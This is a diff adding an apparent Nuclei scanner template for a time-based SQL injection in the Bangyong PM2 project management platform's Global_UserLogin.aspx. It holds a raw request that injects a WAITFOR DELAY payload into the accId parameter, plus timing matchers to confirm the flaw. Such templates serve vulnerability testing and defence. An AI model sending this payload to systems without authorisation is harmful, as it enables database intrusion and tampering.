@@ -1,0 +1,28 @@
+id: poc-yaml-pm2-global-iserlogin-aspx-sqli
+info:
+  name: 邦永PM2项目管理平台 Global_UserLogin.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    邦永PM2项目管理平台存在SQL注入漏洞，通过构造恶意的SQL语句，可以导致敏感信息泄露或数据库被篡改。
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) * 2 + 1}}"
+
+http:
+  - raw:
+      - |
+        GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--&loginCode&password&type HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'WAITFOR')"
+          - "contains(body, '无法找到编号为')"
+          - "duration >= to_number(t1) * 2"
+          - "duration < to_number(t2)"
